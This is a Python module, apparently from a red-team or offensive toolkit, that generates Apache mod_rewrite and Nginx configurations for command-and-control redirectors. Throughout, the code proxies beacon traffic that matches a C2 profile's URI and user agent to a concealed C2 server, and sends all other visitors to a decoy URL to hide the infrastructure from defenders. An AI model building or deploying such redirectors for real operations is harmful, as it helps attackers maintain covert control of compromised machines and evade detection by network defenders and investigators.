"""
C2 redirector config generator.
Produces Apache .htaccess (mod_rewrite + mod_proxy) and Nginx server-block snippets
that transparently proxy beacon traffic matching a known C2 platform profile while
redirecting everything else to an innocuous decoy URL.
"""
from dataclasses import dataclass

from .c2profile import SUPPORTED_PLATFORMS, _PLATFORM_CONFIG


@dataclass
class RedirectorResult:
    platform: str
    apache_htaccess: str
    nginx_config: str


def _apache_config(cfg: dict, c2_host: str, c2_port: int, decoy_url: str) -> str:
    uri = cfg["get_uri"]
    ua = cfg["user_agent"].replace("(", r"\(").replace(")", r"\)")
    return f"""\
# Apache .htaccess — C2 redirector ({cfg['host']} mimicry)
# Requires: mod_rewrite, mod_proxy, mod_proxy_http
# Place in DocumentRoot or VirtualHost. Ensure AllowOverride All.
#
# Enable required modules (run once as root):
#   a2enmod rewrite proxy proxy_http && systemctl restart apache2

RewriteEngine On
ProxyPreserveHost On

# Proxy matching C2 beacon traffic to the C2 server
RewriteCond %{{REQUEST_URI}}   ^{uri}            [NC]
RewriteCond %{{HTTP_USER_AGENT}} {ua} [NC]
RewriteRule ^(.*)$ http://{c2_host}:{c2_port}/$1 [P,L]

# Redirect everything else to decoy site
RewriteRule ^(.*)$ {decoy_url} [R=302,L]"""


def _nginx_config(cfg: dict, c2_host: str, c2_port: int, decoy_url: str) -> str:
    uri = cfg["get_uri"]
    ua = cfg["user_agent"]
    return f"""\
# Nginx server block snippet — C2 redirector ({cfg['host']} mimicry)
# Paste inside a server {{ }} block or include as a conf.d snippet.
# Requires: ngx_http_map_module (compiled in by default)

map $http_user_agent $c2_allowed {{
    default         0;
    "{ua}"  1;
}}

location {uri} {{
    if ($c2_allowed) {{
        proxy_pass         http://{c2_host}:{c2_port};
        proxy_set_header   Host              $host;
        proxy_set_header   X-Forwarded-For   $remote_addr;
        break;
    }}
    return 302 {decoy_url};
}}

location / {{
    return 302 {decoy_url};
}}"""


def generate_redirector(
    platform: str,
    c2_host: str,
    c2_port: int,
    decoy_url: str,
) -> RedirectorResult:
    if platform not in _PLATFORM_CONFIG:
        raise ValueError(f"Unknown platform '{platform}'. Supported: {', '.join(SUPPORTED_PLATFORMS)}")
    cfg = _PLATFORM_CONFIG[platform]
    return RedirectorResult(
        platform=platform,
        apache_htaccess=_apache_config(cfg, c2_host, c2_port, decoy_url),
        nginx_config=_nginx_config(cfg, c2_host, c2_port, decoy_url),
    )
